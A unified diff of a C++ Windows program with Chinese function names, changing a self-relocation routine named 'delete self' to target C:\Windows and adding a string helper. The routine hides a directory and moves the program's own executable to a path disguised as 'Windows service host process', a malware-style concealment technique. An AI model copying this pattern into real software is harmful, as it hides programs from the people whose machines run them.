@@ -62,10 +62,10 @@ bool 删除自身()
 		return false;
 	}
 	//以下API一样，不再啰嗦
-	wsprintf((LPWSTR)NewFileName, L"d:\\Windows\\%C\0", FileName[0]);
+	wsprintf((LPWSTR)NewFileName, L"C:\\Windows\\%C\0", FileName[0]);
 	CreateDirectory((LPCWSTR)NewFileName, NULL);
 	SetFileAttributes((LPCWSTR)NewFileName, FILE_ATTRIBUTE_HIDDEN);
-	wsprintf((LPWSTR)NewFileName, L"d:\\Windows 服务主进程\0", FileName[0], GetTickCount());
+	wsprintf((LPWSTR)NewFileName, L"C:\\Windows 服务主进程\0", FileName[0], GetTickCount());
 	SetFileAttributes((LPCWSTR)NewFileName, FILE_ATTRIBUTE_NORMAL);
 	DeleteFile((LPCWSTR)NewFileName);
 	if (!MoveFileEx((LPCWSTR)FileName, (LPCWSTR)NewFileName, MOVEFILE_REPLACE_EXISTING))
@@ -156,7 +156,7 @@ void 窗口初始化()
 	cy = GetSystemMetrics(SM_CYFULLSCREEN);
 	s_hwnd = GetConsoleWindow();
 	GetWindowRect(s_hwnd, &rect);
-	MoveWindow(s_hwnd, 0, 0, 400, 600, TRUE);
+	MoveWindow(s_hwnd, 0, 0, 800, 600, TRUE);
 	GetWindowRect(s_hwnd, &rect);
 	width = (rect.right - rect.left);
 	height = (rect.bottom - rect.top);
@@ -331,3 +331,12 @@ std::string IntToHex(int num)
 	string str(buffer);
 	return str;
 }
+
+std::string ConstCharToString(const char * c_str)
+{
+	std::string str(c_str);
+	return str;
+}
+
+
+
